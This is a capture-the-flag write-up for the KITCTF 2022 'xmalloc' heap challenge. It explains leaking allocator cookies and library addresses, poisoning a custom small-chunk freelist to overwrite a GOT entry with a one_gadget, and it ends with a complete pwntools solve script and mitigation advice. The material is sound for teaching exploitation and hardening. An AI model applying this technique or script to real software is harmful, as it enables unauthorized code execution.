---
ctf: KITCTFCTF
title: xmalloc
authors:
    - name: ju256
      url: https://ju256.rip/
description: All of our slot machines switched from using the very insecure libc heap implementation to something much more secure internally. Surely this new heap implementation is unbreakable :D
categories:
    - pwn
difficulty: Medium
ctf_year: 2022
event_url: https://2022.ctf.kitctf.de/
solves: 4
points: 500
challengefiles: xmalloc
published: "2026-05-25"
---

# TL;DR

- **Challenge Setup:** Heap challenge using a custom allocator instead of the normal **glibc** heap
- **Key Discoveries:** The custom heap has a fixed heap mapping at `0x31337000`, metadata cookies can be leaked with `puts`, and **libsecureheap.so** only has partial **RELRO** active
- **Vulnerability:** The `edit` functionality always writes `0x1000` bytes into chunks of arbitrary smaller size, allowing heap metadata and freelist pointers to be overwritten
- **Exploitation:** Leak the allocator cookies and `xmain_arena`, poison the small chunk freelist to allocate on `verify_cookies@got.plt`, overwrite it with a **One Gadget**, and trigger another allocation to obtain RCE

# Introduction

This challenge was about exploiting a custom heap implementation. The actual binary is called `sandbox` which prompts the user with a menu of different options, but there is no seccomp filter or syscall sandbox involved. The "sandbox" is the allocator itself, which is implemented in `libsecureheap.so`.

The binary gives us the usual heap menu with typical heap challenge options like `alloc`, `delete`, `edit` and `show`. The interesting part about this challenge is that allocations and frees are not implemented by calling **malloc** and **free** from **glibc**. Instead, the challenge uses `xmalloc` and `xfree` from the custom shared library. So basically the challenge implements its own small allocator with metadata, freelists and integrity checks. The description already hints at the idea of the challenge: this allocator tries to be more secure than **glibc**, but it still has to manage all of this state correctly.

# Reconnaissance

Checking with `checksec` we discover that the deployed `sandbox` has a lot of the relevant hardening properties enabled:

```text
$ checksec --file sandbox
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

However, the allocator library is more interesting:

```text
$ checksec --file libsecureheap.so
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

So the main binary **GOT** is not a good target, but the **GOT** of `libsecureheap.so` is writable. But to actually write there we still need the crucial parts: an address leak and a useful write primitive.

Analyzing the custom heap implementation, the allocator requests its own heap at a fixed address, independent of the binary base:

```c
#define HEAP_SIZE 0x10000
#define HEAP_BASE 0x31337000

void *heapaddr = mmap((void *)HEAP_BASE, HEAP_SIZE * MAX_ARENAS, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
```

This makes the heap layout very stable for the exploit and we don't even have to leak the binary base address. The allocator also maps a separate random cookie jar and stores one cookie for every chunk:

```c
struct Chunk {
    u64 cookie;
    u32 magic;
    u32 size;
    struct Chunk *next;
};

struct FreeChunk {
    Chunk chunk;
    struct FreeChunk *next_free;
};

struct LargeFreeChunk {
    Chunk chunk;
    struct LargeFreeChunk *prev_free;
    struct LargeFreeChunk *next_free;
};
```

This is roughly comparable to a stack canary, but for heap chunks. Before every `xmalloc` and `xfree`, the allocator checks whether all stored cookies still match the chunks:

```c
void verify_cookies() {
    CookieJar *current_jar = xmain_arena.cookie_jar;
    while (current_jar != NULL) {
        if (current_jar->chunk == NULL) break;
        if (current_jar->chunk->cookie != current_jar->cookie) {
            xerror("Memory corruption detected: Cookie overwritten.");
        }
        current_jar = current_jar->next;
    }
}
```

So for a useful overflow we either have to avoid touching cookies or leak and restore the correct cookie values. Otherwise, after corrupting a cookie, we must not trigger another `verify_cookies` call until the **GOT** entry of `verify_cookies` has already been overwritten.

# Vulnerability Description

The vulnerability is directly in the menu binary. The challenge even points at it via a comment:

```c
void edit() {
    u32 index;
    printf("Index: ");
    index = read_int();
    if (index < 0x20 && chunks[index] != NULL) {
        printf("Data: ");
        // I left this overflow for you. There's no way to do anything with it anyways,
        // because the heap security is to good.
        read(0, chunks[index], 0x1000);
    } else {
        puts("Invalid index");
    }
}
```

No matter how large the chunk actually is, `edit` writes up to `0x1000` bytes into it. This gives us a linear overflow from one chunk into the next chunk's metadata. The custom heap tries to protect this metadata with cookies, but the `show` function gives us a leak primitive:

```c
void show() {
    u32 index;
    printf("Index: ");
    index = read_int();
    if (index < 0x20 && chunks[index] != NULL) {
        puts(chunks[index]);
    } else {
        puts("Invalid index");
    }
}
```

Another interesting behavior is the `puts` in the `show` menu option, which prints until a null byte. The allocator tries to make cookies string-safe by clearing their least significant byte. On little-endian this is the first byte in memory, so the cookie starts with a null byte:

```c
u64 gen_cookie() {
    u64 cookie = (((u64)rand()) << 32) | (rand());
    cookie &= ~0xff;
    return cookie;
}
```

But this does not actually prevent them from getting leaked. If we overflow exactly up to the cookie and send the payload with a trailing newline, this overwrites the zero byte with `0x0a`. Then `puts` prints the first part of the chunk, hits the newline, and the next output line contains the remaining seven random bytes of the cookie.

The same idea is used to leak an address from `libsecureheap.so`. After freeing a large chunk, the chunk contains freelist pointers to the global guard chunks. By overflowing up to the `prev_free` pointer and using `puts`, the exploit leaks the upper seven bytes of the `guard_tail` pointer. Because the low byte is replaced by the newline and reconstructed as `0x00`, the resulting value is not exactly `guard_tail`, but `xmain_arena + 0x60`. Subtracting `0x60` gives the address of `xmain_arena`.

There is another important implementation bug in the large freelist. Large chunks are inserted through `guard_head.prev_free` and `guard_tail.next_free`, but `xmalloc` checks `guard_head.next_free` when looking for a reusable large chunk. Because of this, the allocator does not actually reuse the freed large chunk in the way one would expect. The old freed chunk stays in the normal chunk chain and a later large allocation creates a new chunk at the top of the fixed heap. This layout is exactly what the final exploit abuses.

The final control flow target is the writable **GOT** entry of `verify_cookies` in `libsecureheap.so`. This function is perfect, because every future call to `xmalloc` and `xfree` reaches it before doing any allocator work and we can reliably trigger it via the menu.

# Exploitation

The exploit starts by allocating three chunks and freeing the second one:

```python
first_chunk = alloc(b'100')
second_chunk = alloc(b'200')
third_chunk = alloc(b'50')
...
free(second_chunk)
```

In [pwndbg](https://pwndbg.re/) we can see that the three created chunks are connected with each other as a singly linked list. We can also observe that the freed second chunk now references `guard_tail` and `guard_head` in `xmain_arena`:

![initial state](ctf/writeups/kitctf/xmalloc/initial-state.png "initial state")

The blue box marks pointers into the `xmain_arena` area.

Now the first chunk can overflow into the freed second chunk. The distance from the first chunk's user data to the second chunk's cookie is `0x70`, so the exploit sends `14*8` bytes and leaks the remaining seven cookie bytes:

```python
edit(first_chunk, b'A' * (14*8))
show(first_chunk)
```

Now we can see the newline overflowing into the first byte of the cookie, thus replacing the null byte and enabling the leak via `puts`:

![first overflow state](ctf/writeups/kitctf/xmalloc/first-overflow-state-get-cookie.png "first overflow state")

After that, the exploit leaks a pointer from the large freelist metadata with the same approach. The second freed chunk's `prev_free` field is at offset `0x70 + 0x18` from the first chunk's user pointer:

```python
edit(first_chunk, b'A' * (14*8 + 3*8))
show(first_chunk)
```

The leaked pointer originally points to `guard_tail`, but the low byte is destroyed by the newline. Reconstructing it with a zero low byte gives `xmain_arena + 0x60`, which is why we have to subtract `0x60`. `libsecureheap.so` and `libc-2.31.so` have a stable relative distance, so we can derive the **libc** base from this leak by subtracting `0x1F60A0` from the `xmain_arena` address.

At this point the old freed second chunk is corrupted by the two leak payloads. Before we can call `alloc` or `delete` again, the cookie has to match the value stored in the cookie jar, otherwise `verify_cookies` would immediately abort the process. So the next payload restores the old chunk's cookie and writes a plausible `magic` / `size` pair. It does not fully restore the old chunk as a clean freelist entry though. The normal chunk-chain `next` pointer is forged on purpose:

```python
edit(first_chunk, (
    b'A' * (14*8)
    + cookie
    + magic
    + (main_arena + 0x50).to_bytes(length=8, byteorder='little')
))
```

The `magic` value is the hardcoded magic value packed together with the freed large chunk size: `magic = 0xdeadbeef` and `size = 0xd0`.

The most important field in this payload is the forged `next` pointer. It is set to `xmain_arena + 0x50`, which is `guard_head + 0x10`. When the allocator later walks the normal chunk chain, it treats this address as a fake `Chunk`. The fake chunk's `next` field is read from `guard_head.next_free`, which points to `guard_tail`. `guard_tail->chunk.next` is initially `NULL`, so the allocator can append a new top chunk there. This also means the original third chunk is no longer part of the allocator's normal chunk chain, but that does not matter for the exploit.

Because of the broken large freelist handling, the following `alloc(200)` does not reuse the old freed second chunk. Instead, it creates a fresh large chunk at the current heap top and appends it through the forged chain described above. Since `free(second_chunk)` cleared slot `1`, this fresh allocation is stored in index `1` again.

This detail is important for the rest of the exploit. After the reallocation this same index now points to the fresh large chunk, not the old freed one. From there, the exploit allocates three small chunks directly after the fresh large chunk and frees the first two:

```python
forth_chunk = alloc(b'50')
fifth_chunk = alloc(b'50')
sixth_chunk = alloc(b'50')

free(forth_chunk)
free(fifth_chunk)
```

The small freelist is singly linked. The fresh large chunk in index `1` has a user size of `0xd0`. Therefore, overflowing index `1` by `13*2*8` bytes reaches the metadata of `forth_chunk`. Again, the exploit leaks the cookie by overwriting only the low null byte with a newline:

```python
edit(second_chunk, b'0' * (13*2*8))
show(second_chunk)
cookie_leak = b'\x00' + io.recvline()[0:7]
```

After that the real freelist poisoning happens. The small freelist currently still starts at `fifth_chunk` and then points to `forth_chunk`:

![new chain free small chunks](ctf/writeups/kitctf/xmalloc/new-chain-freed-small-chunks.png "new chain free small chunks")

The yellow boxes show the end of a linked chain.

The overflow from the fresh large chunk reaches `forth_chunk`, so the exploit overwrites `forth_chunk->next_free`. For small chunks, this pointer is at offset `0x18` from the chunk header. The target address is `verify_cookies@got.plt` in `libsecureheap.so`. The exploit stores it as an offset from the leaked **libc** base because the relative distance is stable in the deployed setup:

```python
libc_got_target = libc_base + 0x1F6048

edit(second_chunk, flat([
    b'0' * (13*2*8),
    cookie,
    magic,
    (main_arena + 0xe0).to_bytes(length=8, byteorder='little'),
    libc_got_target - (5*8),
]))
```

![new chain free small chunks reaching into GOT](ctf/writeups/kitctf/xmalloc/new-chain-freed-small-chunks-reach-in-got.png "new chain free small chunks reaching into GOT")

The important values are the restored cookie and the forged `next_free` pointer. The small freelist pop does not validate the old size before `create_chunk` overwrites the header again.

The written freelist pointer is `libc_got_target - (5*8)`, which is `verify_cookies@got.plt - 0x28`. This offset matters because `xmalloc` returns `chunk + sizeof(LargeFreeChunk)`, and `sizeof(LargeFreeChunk)` is `0x28`. With this setup, the small freelist becomes `fifth_chunk -> forth_chunk -> fake_chunk_before_GOT`.

The next allocations just walk the poisoned freelist. The first one pops `fifth_chunk`, the second one pops `forth_chunk` and makes the fake **GOT** chunk the new freelist head:

```python
reforth_chunk = alloc(b'50')
edit(reforth_chunk, b'A'*4)

prep = alloc(b'50')
edit(prep, b'C'*16)
```

During the third allocation, `xmalloc` treats the fake address as a free chunk. `create_chunk` writes a fresh fake chunk header before the target **GOT** entry and then returns a user pointer exactly at `verify_cookies@got.plt`. So `libc_got` is now a writable pointer directly onto the `verify_cookies` **GOT** entry.

```python
libc_got = alloc(b'50')
print(f'Overwriting got at {hex(libc_got_target)} with onegadget {hex(one_gadget)}')
edit(libc_got, int.to_bytes(one_gadget, length=8, byteorder='little'))
```

In `pwndbg` we can see the fake chunk in the **GOT**:

![fake chunk in GOT](ctf/writeups/kitctf/xmalloc/fake-chunk-in-got.png "fake chunk in GOT")

The dark blue rectangle shows the typical chunk metadata, written into the **GOT**.

The chosen gadget comes from using the [one_gadget](https://github.com/david942j/one_gadget) tool:

```text
$ one_gadget libc-2.31.so
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

In the debugger we can see the **one_gadget** being referenced by the `verify_cookies@got.plt` entry:

![fake chunk in GOT into one gadget](ctf/writeups/kitctf/xmalloc/fake-chunk-in-got-into-one-gadget.png "fake chunk in GOT into one gadget")

The `0xe3b01` gadget is the one used by the solve script. In the observed call path through `xmalloc`, its constraints are satisfied, so redirecting `verify_cookies` there is enough to get code execution.

Finally, the exploit triggers one more allocation:

```python
alloc(b'50')
```

This calls `xmalloc`, which calls `verify_cookies@plt`, which now resolves to the **one_gadget**. The result is a shell, and because there is no seccomp filter, reading the flag is straightforward.

# Mitigation

The primary bug is the fixed-size write in `edit`. The binary has to store the size of every allocation and only allow writes up to that size. A custom allocator with canaries can't compensate for arbitrary out-of-bounds writes into its metadata. Moreover, the allocator library should be linked with full **RELRO** so its **GOT** is not writable. Also, using a custom heap implementation for security is almost always risky. The normal **glibc** heap has had many years of hardening work. Reimplementing this correctly is much harder than it first looks.

# Solve Script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("sandbox_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
gdbscript="""
continue
"""

def conn():
    if args.REMOTE:
        r = remote(sys.argv[1], sys.argv[2])
    else:
        r = process([exe.path])
        # gdb.attach(r, gdbscript=gdbscript)

    return r


def main():
    io = conn()

    def at_idx(idx):
        io.sendlineafter(b'Index: ', idx)
    def alloc(size):
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'Size: ', size)
        idx = io.recvline().split(b'Index: ')[1].split(b'\n')[0]
        return idx
    def free(idx):
        io.sendlineafter(b'> ', b'2')
        at_idx(idx)
    def edit(idx, data):
        io.sendlineafter(b'> ', b'3')
        at_idx(idx)
        io.sendlineafter(b'Data: ', data)
    def show(idx):
        io.sendlineafter(b'> ', b'4')
        at_idx(idx)
        content = io.recvline()
        return content
    def exit():
        io.sendlineafter(b'> ', b'0')

    first_chunk = alloc(b'100')
    second_chunk = alloc(b'200')
    third_chunk = alloc(b'50')

    edit(first_chunk, b'A' * 4)
    edit(second_chunk, b'B' * 4)
    edit(third_chunk, b'C' * 4)

    free(second_chunk)

    edit(first_chunk, b'A' * (14*8))
    show(first_chunk)
    second_chunk_cookie_leak = b'\x00' + io.recvline()[0:7]
    cookie = second_chunk_cookie_leak
    cookie_int = int.from_bytes(second_chunk_cookie_leak, byteorder='little')
    magic = 0xd0deadbeef.to_bytes(length=8, byteorder='little')
    next = 0x31337190.to_bytes(length=8, byteorder='little')

    edit(first_chunk, b'A' * (14*8 + 3*8))
    show(first_chunk)
    main_arena_leak = b'\x00' + io.recvline()[0:7].split(b'\n')[0]
    main_arena = int.from_bytes(main_arena_leak, byteorder='little') - 0x60

    print(f'main_arena: {hex(main_arena)}')

    libc_leak_offset = 0x1F60A0
    libc_base = main_arena - libc_leak_offset

    # self.validate_leaked_addresses(io, libc_base=libc_base)
    print(f'[*] Found libc base: {hex(libc_base)}')

    edit(first_chunk, (
        b'A' * (14*8)
        + cookie
        + magic
        + (main_arena + 0x50).to_bytes(length=8, byteorder='little')
    ))
    second_chunk_realloc = alloc(b'200')
    edit(second_chunk_realloc, b'Z' * 4)

    forth_chunk = alloc(b'50')
    fifth_chunk = alloc(b'50')
    sixth_chunk = alloc(b'50')
    edit(forth_chunk, b'4' * 4)
    edit(fifth_chunk, b'5' * 4)
    edit(sixth_chunk, b'6' * 4)

    free(forth_chunk)
    free(fifth_chunk)

    edit(second_chunk, b'0' * (13*2*8))
    show(second_chunk)
    cookie_leak = b'\x00' + io.recvline()[0:7]
    cookie = int.from_bytes(cookie_leak, byteorder='little')
    print(f'found cookie: {hex(cookie)}')

    # one_gadget = libc_base + 0xe3afe
    one_gadget = libc_base + 0xe3b01
    # one_gadget = libc_base + 0xe3b04
    libc_got_target = libc_base + 0x1F6048

    edit(second_chunk, flat([
        b'0' * (13*2*8),
        cookie,
        magic,
        (main_arena + 0xe0).to_bytes(length=8, byteorder='little'),
        libc_got_target - (5*8),
    ]))
    reforth_chunk = alloc(b'50')
    edit(reforth_chunk, b'A'*4)

    prep = alloc(b'50')
    edit(prep, b'C'*16)

    libc_got = alloc(b'50')
    print(f'Overwriting got at {hex(libc_got_target)} with onegadget {hex(one_gadget)}')
    edit(libc_got, int.to_bytes(one_gadget, length=8, byteorder='little'))

    alloc(b'50')

    io.interactive()


if __name__ == "__main__":
    main()
```

# Flag

KITCTF{dQw4w9WgXcQ}
